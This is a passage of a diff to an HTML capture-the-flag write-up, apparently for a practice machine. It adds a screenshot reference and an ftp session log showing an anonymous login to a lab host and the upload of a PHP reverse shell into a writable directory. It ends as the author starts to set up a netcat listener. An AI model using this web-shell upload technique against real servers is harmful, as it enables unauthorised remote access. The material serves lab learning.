@@ -140,10 +140,40 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 </pre></code>
 <p>After moving to the newly discovered directory it clearly shows the ftp server!</p>
-<img src=""
+
+
+<img src="pictures/StartUp_gobuster.png">
+
+
 <p>And if we remember from our nmap scan ftp folder is WRITABLE!! That means we can upload reverse shell and get into the machine!<p>
 <p>I will be using <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentest monkey’s php reverse shell and upload it to ftp.</a></p>
-
+<pre><code>
+$ ftp 10.10.104.34
+Connected to 10.10.104.34.
+220 (vsFTPd 3.0.3)
+Name (10.10.104.34:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd ftp
+250 Directory successfully changed.
+ftp> put reverse-shell.php
+local: reverse-shell.php remote: reverse-shell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5490 bytes sent in 0.00 secs (141.5046 MB/s)
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxrwxr-x    1 112      118          5490 Nov 18 20:55 reverse-shell.php
+226 Directory send OK.
+ftp> exit
+221 Goodbye.
+</pre></code>
+<p>Set up a netcat connection 
 
 
 
